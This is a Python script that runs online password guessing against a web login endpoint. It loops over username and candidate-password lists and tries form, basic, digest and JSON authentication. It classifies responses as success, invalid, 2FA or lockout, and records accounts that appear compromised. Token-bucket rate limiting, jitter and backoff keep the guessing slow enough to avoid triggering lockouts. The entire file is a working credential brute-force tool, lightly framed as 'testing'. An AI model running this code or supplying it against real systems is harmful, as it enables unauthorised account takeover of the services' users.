#!/usr/bin/env python3

import os
import sys
import csv
import time
import random
import hashlib
import requests
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import re
from hashlib import blake2b
from urllib.parse import urlparse
from datetime import datetime, timezone

LOGIN_PATH_HINTS = ["login", "signin"]
AUTH_COOKIE_HINTS = ["session", "auth", "jwt"]
AUTH_PROBE_URL = "/me"
AUTH_PROBE_OK_STATUSES = {200}
FAIL_PHRASES = ["invalid", "incorrect", "try again", "failed", "locked", "disabled"]
LOGIN_MARKERS = ["<form", "name=\"username\"", "name=\"password\"", "type=\"password\""]

def short_hash(s):
    return blake2b(s.encode("utf-8"), digest_size=16).hexdigest()

def normalize_body(text):
    t = re.sub(r"\s+", " ", text).strip().lower()
    return t[:20000]

def extract_title(text):
    m = re.search(r"<title[^>]*>(.*?)</title>", text, re.IGNORECASE)
    return m.group(1).strip().lower() if m else ""

class LoginFingerprint:
    def __init__(self, session, base_url):
        self.base_url = base_url.rstrip("/")
        r = session.get(self.base_url + "/login.html", allow_redirects=True, timeout=10)
        self.normalized = normalize_body(r.text)
        self.body_hash = short_hash(self.normalized)
        self.title = extract_title(self.normalized)

def is_login_path(url):
    p = urlparse(url)
    last = (p.path or "").strip("/").split("/")[-1]
    return any(h in last for h in LOGIN_PATH_HINTS)

def has_auth_cookie(resp):
    # Check final response headers
    for k, v in resp.headers.items():
        if k.lower() == "set-cookie":
            cs = v.lower()
            if any(h in cs for h in AUTH_COOKIE_HINTS):
                return True
    
    # Check redirect history for Set-Cookie headers
    if hasattr(resp, 'history') and resp.history:
        for hist_resp in resp.history:
            for k, v in hist_resp.headers.items():
                if k.lower() == "set-cookie":
                    cs = v.lower()
                    if any(h in cs for h in AUTH_COOKIE_HINTS):
                        return True
    
    return False

def looks_like_login(text_norm):
    if any(m in text_norm for m in LOGIN_MARKERS):
        return True
    if login_fp and login_fp.title and extract_title(text_norm) == login_fp.title:
        return True
    if login_fp and short_hash(text_norm) == login_fp.body_hash:
        return True
    return False

def contains_fail_phrase(text_norm):
    return any(p in text_norm for p in FAIL_PHRASES)

def classify_result(final_resp, history, session, base_url):
    for h in history + [final_resp]:
        if h.status_code == 429:
            return "rate_limited"
        if h.status_code == 423:
            return "locked"
        loc = h.headers.get("Location") or h.headers.get("location")
        if loc and is_login_path(loc):
            return "invalid"
    if is_login_path(final_resp.url):
        return "invalid"
    text_norm = normalize_body(final_resp.text)
    if contains_fail_phrase(text_norm):
        return "invalid"
    if looks_like_login(text_norm):
        return "invalid"
    if "2fa" in text_norm or "verification code" in text_norm:
        return "maybe_2fa"
    # For HTML form auth, success is indicated by redirect to success page + auth cookie
    has_cookie = has_auth_cookie(final_resp)
    if has_cookie and not is_login_path(final_resp.url):
        return "success"
    
    # If no cookie, try probe as fallback
    if has_cookie:
        try:
            probe = session.get(base_url.rstrip("/") + AUTH_PROBE_URL, allow_redirects=False, timeout=10)
            if probe.status_code in AUTH_PROBE_OK_STATUSES:
                pn = normalize_body(probe.text)
                if not looks_like_login(pn):
                    return "success"
        except:
            pass
    
    return "invalid"

class TokenBucket:
    def __init__(self, rate=2.0):
        self.rate = rate
        self.capacity = rate * 2
        self.tokens = self.capacity
        self.last_update = time.time()
    
    def consume(self):
        now = time.time()
        elapsed = now - self.last_update
        self.tokens = min(self.capacity, self.tokens + elapsed * self.rate)
        self.last_update = now
        
        if self.tokens >= 1:
            self.tokens -= 1
            return True
        return False

class OnlineTester:
    def __init__(self):
        self.target_url = os.environ.get('TARGET_URL')
        if not self.target_url:
            print("ERROR: TARGET_URL environment variable not set")
            sys.exit(1)
            
        self.session = requests.Session()
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            backoff_factor=1,
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.bucket = TokenBucket(rate=2.0)
        self.backoff_delays = {}
        
        self.pattern_table = {
            'invalid': [
                r'invalid.*(?:username|password|credentials?)',
                r'incorrect.*(?:username|password|credentials?)',
                r'(?:username|password).*(?:invalid|incorrect|wrong)',
                r'authentication.*fail',
                r'login.*fail',
                r'access.*denied'
            ],
            'maybe_2fa': [
                r'two.factor',
                r'2fa',
                r'mfa',
                r'multi.factor',
                r'verification.*code',
                r'authenticator',
                r'token.*required'
            ],
            'expired_password': [
                r'password.*expir',
                r'expir.*password',
                r'password.*change.*requir',
                r'must.*change.*password',
                r'password.*reset.*requir'
            ],
            'success?': [
                r'welcome',
                r'dashboard',
                r'logged.*in',
                r'successful',
                r'home.*page',
                r'profile',
                r'account.*overview'
            ]
        }
        
        self.lockout_phrases = ["locked", "too many", "rate", "try again"]
        self.successful_users = set()
        self.stats = {
            'total_attempts': 0,
            'invalid': 0,
            'maybe_2fa': 0,
            'expired_password': 0,
            'success?': 0,
            'lockouts': 0,
            'errors': 0
        }
        
        self.init_output_files()
    
    def init_output_files(self):
        os.makedirs('logs', exist_ok=True)
        os.makedirs('evidence', exist_ok=True)
        
        with open('logs/attempts.csv', 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['timestamp', 'username', 'status_code', 'response_time_ms', 'response_hash', 'outcome', 'final_url', 'redirect_chain', 'login_fp_hash', 'probe_status'])
    
    def load_file_lines(self, filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"ERROR: {filename} not found")
            sys.exit(1)
    
    def normalize_body(self, text):
        text = re.sub(r'\s+', ' ', text.lower().strip())
        return text[:1024]
    
    def hash_response(self, text):
        normalized = self.normalize_body(text)
        return hashlib.blake2b(normalized.encode(), digest_size=16).hexdigest()
    
    def classify_outcome(self, status_code, body_text):
        if status_code == 200:
            body_lower = body_text.lower()
            
            for category, patterns in self.pattern_table.items():
                for pattern in patterns:
                    if re.search(pattern, body_lower):
                        return category
            
            return 'success?'
        elif status_code in [401, 403]:
            return 'invalid'
        elif status_code == 429:
            return 'lockout'
        else:
            return 'error'
    
    def is_lockout_response(self, body_text):
        body_lower = body_text.lower()
        return any(phrase in body_lower for phrase in self.lockout_phrases)
    
    def get_backoff_delay(self, target_key):
        if target_key not in self.backoff_delays:
            self.backoff_delays[target_key] = 1.0
        else:
            self.backoff_delays[target_key] = min(self.backoff_delays[target_key] * 2, 60.0)
        return self.backoff_delays[target_key]
    
    def reset_backoff(self, target_key):
        self.backoff_delays[target_key] = 1.0
    
    def make_request(self, username, password):
        while not self.bucket.consume():
            time.sleep(0.1)
        
        jitter = random.uniform(0.1, 0.25)
        time.sleep(jitter)
        
        start_time = time.time()
        
        try:
            if 'login' in self.target_url.lower() and 'html' in self.target_url.lower():
                data = f'httpd_username={username}&httpd_password={password}'
                # POST to dologin.html instead of login.html for form submission
                dologin_url = self.target_url.replace('/login.html', '/dologin.html')
                response = self.session.post(
                    dologin_url,
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=10,
                    allow_redirects=True
                )
            elif 'basicauth' in self.target_url.lower():
                response = self.session.get(
                    self.target_url,
                    auth=(username, password),
                    timeout=10
                )
            elif 'digestauth' in self.target_url.lower():
                from requests.auth import HTTPDigestAuth
                response = self.session.get(
                    self.target_url,
                    auth=HTTPDigestAuth(username, password),
                    timeout=10
                )
            else:
                response = self.session.post(
                    self.target_url,
                    json={'username': username, 'password': password},
                    timeout=10
                )
            
            response_time = int((time.time() - start_time) * 1000)
            body_text = response.text if response.text else ""
            response_hash = self.hash_response(body_text)
            
            chain = list(response.history) if hasattr(response, "history") and response.history else []
            outcome = classify_result(response, chain, self.session, BASE_URL or "")
            final_url = getattr(response, "url", "")
            redirect_chain = " > ".join([getattr(h, "url", "") for h in chain] + [final_url])
            resp_hash = short_hash(normalize_body(getattr(response, "text", "")))
            probe_status = ""
            try:
                pr = self.session.get((BASE_URL or "").rstrip("/") + AUTH_PROBE_URL, allow_redirects=False, timeout=10)
                probe_status = str(pr.status_code)
            except Exception:
                probe_status = "error"
            
            needs_backoff = False
            if outcome in ["rate_limited", "locked"]:
                needs_backoff = True
            
            if needs_backoff:
                backoff_delay = self.get_backoff_delay(self.target_url)
                time.sleep(backoff_delay)
            else:
                self.reset_backoff(self.target_url)
            
            return {
                'status_code': response.status_code,
                'response_time_ms': response_time,
                'response_hash': response_hash,
                'outcome': outcome,
                'final_url': final_url,
                'redirect_chain': redirect_chain,
                'login_fp_hash': login_fp.body_hash if login_fp else '',
                'probe_status': probe_status
            }
            
        except requests.exceptions.RequestException:
            response_time = int((time.time() - start_time) * 1000)
            return {
                'status_code': 0,
                'response_time_ms': response_time,
                'response_hash': 'ERROR',
                'outcome': 'error',
                'final_url': '',
                'redirect_chain': '',
                'login_fp_hash': login_fp.body_hash if login_fp else '',
                'probe_status': 'error'
            }
    
    def log_attempt(self, username, result):
        timestamp = datetime.now(timezone.utc).isoformat()
        
        with open('logs/attempts.csv', 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                timestamp,
                username,
                result['status_code'],
                result['response_time_ms'],
                result['response_hash'],
                result['outcome'],
                result.get('final_url', ''),
                result.get('redirect_chain', ''),
                result.get('login_fp_hash', ''),
                result.get('probe_status', '')
            ])
        
        self.stats['total_attempts'] += 1
        if result['outcome'] in self.stats:
            self.stats[result['outcome']] += 1
        elif result['outcome'] == 'lockout':
            self.stats['lockouts'] += 1
        elif result['outcome'] == 'error':
            self.stats['errors'] += 1
    
    def record_success(self, username):
        self.successful_users.add(username)
        with open('evidence/successes_redacted.csv', 'a', newline='') as f:
            writer = csv.writer(f)
            if os.path.getsize('evidence/successes_redacted.csv') == 0:
                writer.writerow(['username'])
            writer.writerow([username])
    
    def run_test(self):
        usernames = self.load_file_lines('usernames.txt')
        candidates = self.load_file_lines('candidates.txt')
        
        print(f"Starting online password testing")
        print(f"Target: {self.target_url}")
        print(f"Usernames: {len(usernames)}")
        print(f"Candidates: {len(candidates)}")
        print()
        
        for username in usernames:
            if username in self.successful_users:
                continue
                
            for candidate in candidates:
                if username in self.successful_users:
                    break
                
                result = self.make_request(username, candidate)
                self.log_attempt(username, result)
                
                if result['outcome'] == 'success?':
                    self.record_success(username)
                    print(f"SUCCESS: {username} (stopping further attempts for this user)")
                    break
                elif result['outcome'] == 'lockout':
                    print(f"LOCKOUT detected for {username} - stopping attempts")
                    break
        
        self.print_summary()
    
    def print_summary(self):
        print()
        print("=== SUMMARY STATISTICS ===")
        print(f"Total attempts: {self.stats['total_attempts']}")
        print(f"Invalid credentials: {self.stats['invalid']}")
        print(f"Possible 2FA required: {self.stats['maybe_2fa']}")
        print(f"Expired password: {self.stats['expired_password']}")
        print(f"Potential success: {self.stats['success?']}")
        print(f"Lockouts encountered: {self.stats['lockouts']}")
        print(f"Network errors: {self.stats['errors']}")
        print(f"Successful users: {len(self.successful_users)}")

if __name__ == "__main__":
    try:
        session
    except NameError:
        import requests
        session = requests.Session()
    try:
        BASE_URL
    except NameError:
        import os
        BASE_URL = os.environ.get("BASE_URL", "").rstrip("/")
    
    try:
        login_fp = LoginFingerprint(session, BASE_URL or "http://localhost")
    except Exception as e:
        login_fp = None
        print(f"Warning: Could not initialize login fingerprint: {e}")

try:
    session
except NameError:
    import requests
    session = requests.Session()
try:
    BASE_URL
except NameError:
    import os
    BASE_URL = os.environ.get("BASE_URL", "").rstrip("/")
try:
    login_fp
except NameError:
    login_fp = None

def main():
    tester = OnlineTester()
    tester.run_test()

if __name__ == "__main__":
    main()